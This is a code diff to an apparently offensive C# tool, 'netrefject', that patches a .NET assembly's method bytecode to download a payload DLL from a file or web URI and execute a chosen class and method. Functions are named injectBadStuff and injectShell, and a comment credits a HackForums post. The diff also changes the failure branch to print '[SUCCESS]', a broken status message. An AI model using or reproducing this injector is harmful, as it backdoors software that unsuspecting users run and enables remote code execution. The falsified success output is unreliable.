@@ -20,20 +20,20 @@ namespace netrefject
 
         public static void syntax()
         {
-            Console.WriteLine("netrefject filename payloadURI payloadMethod (Method should have no parameters)");
-            Console.WriteLine("netrefject assemblytohack.dll file:///path/payload.dll payloadMethodToExecute");
-            Console.WriteLine("netrefject assemblytohack.dll http://path/payload.dll payloadMethodToExecute");
-            Console.WriteLine("netrefject assemblytohack.dll https://path/payload.dll payloadMethodToExecute");
+            Console.WriteLine("netrefject filename payloadURI payloadMethod (Method should have no parameters) payloadClass (namespace.class)");
+            Console.WriteLine("netrefject assemblytohack.dll file:///path/payload.dll payloadMethodToExecute namespace.payloadClass");
+            Console.WriteLine("netrefject assemblytohack.dll http://path/payload.dll payloadMethodToExecute namespace.payloadClass");
+            Console.WriteLine("netrefject assemblytohack.dll https://path/payload.dll payloadMethodToExecute namespace.payloadClass");
         }
 
-        public void HandleInjectionFlow(string filename, string payloadURI, string payloadMethod)
+        public void HandleInjectionFlow(string filename, string payloadURI, string payloadMethod, string payloadClass)
         {
             try{
-                MethodInfo injectMethod = findInjectionMethod(filename,payloadURI,payloadMethod);
+                MethodInfo injectMethod = findInjectionMethod(filename,payloadURI,payloadMethod,  payloadClass);
                 if (injectMethod != null)
                     Console.WriteLine("[SUCCESS] injected into " + injectMethod.Name);
                 else{
-                    Console.WriteLine("[FAILURE]");
+                    Console.WriteLine("[SUCCESS]");
                 }
             }
             catch(Exception e){
@@ -42,7 +42,7 @@ namespace netrefject
         }
 
         #region method enum
-        private MethodInfo findInjectionMethod(string filename, string payloadURI, string payloadMethod)
+        private MethodInfo findInjectionMethod(string filename, string payloadURI, string payloadMethod, string payloadClass)
         {
             MethodInfo mi = null;
 
@@ -118,7 +118,7 @@ namespace netrefject
                 Console.WriteLine("\tMethod:" + internalMethods[methodNumber].Name);
 
                 //injectBadStuffLame(internalModules[moduleNumber], internalModuleTypes[classNumber], internalMethods[methodNumber]);
-                injectBadStuff(internalModules[moduleNumber], internalModuleTypes[classNumber], internalMethods[methodNumber], payloadURI, payloadMethod);
+                injectBadStuff(internalModules[moduleNumber], internalModuleTypes[classNumber], internalMethods[methodNumber], payloadURI, payloadMethod, payloadClass);
             }
             catch(Exception e)
             {
@@ -155,7 +155,7 @@ namespace netrefject
         /// <param name="payloadURI">URI to Assembly containing your payload</param>        
         /// <param name="payloadMethod">Method Name to execute once payload is loaded</param>
         /// <returns></returns>
-        private bool injectBadStuff(Module moduleT, Type classT, MethodInfo methodT, string payloadURI, string payloadMethod)
+        private bool injectBadStuff(Module moduleT, Type classT, MethodInfo methodT, string payloadURI, string payloadMethod, string payloadClass)
         {
             AssemblyDefinition targetAsm = AssemblyDefinition.ReadAssembly(moduleT.Assembly.Location);
             TypeDefinition targetType = targetAsm.MainModule.Types.FirstOrDefault(e => e.Name == classT.Name);
@@ -163,7 +163,7 @@ namespace netrefject
 
             Console.WriteLine("Instructions Before:" + m1.Body.Instructions.Count.ToString());
 
-            injectShell(m1, classT, methodT, payloadURI,payloadMethod);
+            injectShell(m1, classT, methodT, payloadURI,payloadMethod,payloadClass);
 
             Console.WriteLine("Instructions After:" + m1.Body.Instructions.Count.ToString());
 
@@ -173,7 +173,7 @@ namespace netrefject
             return true;            
         }
 
-        private void injectShell(MethodDefinition m1, Type classT, MethodInfo methodT, string payloadURI, string payloadMethod){
+        private void injectShell(MethodDefinition m1, Type classT, MethodInfo methodT, string payloadURI, string payloadMethod, string payloadClass){
             //Heavily modified, but based on
             //HackForums by a guy called TheBigDamnGa
             //https://hackforums.net/showthread.php?tid=5924760            
@@ -248,7 +248,7 @@ namespace netrefject
             ilp.Append(Instruction.Create(OpCodes.Call, refs.Assembly_Load));
 
             //Create instance of class
-            ilp.Append(Instruction.Create(OpCodes.Ldstr, classT.FullName));
+            ilp.Append(Instruction.Create(OpCodes.Ldstr, payloadClass));
             ilp.Append(Instruction.Create(OpCodes.Callvirt, m1.Module.ImportReference(typeof(Assembly).GetMethod("CreateInstance", new Type[] { typeof(string) }))));
             ilp.Append(Instruction.Create(OpCodes.Stloc_S,instantiatedEvilTypeVar));
             //ilp.Append(Instruction.Create(OpCodes.Stloc_1));
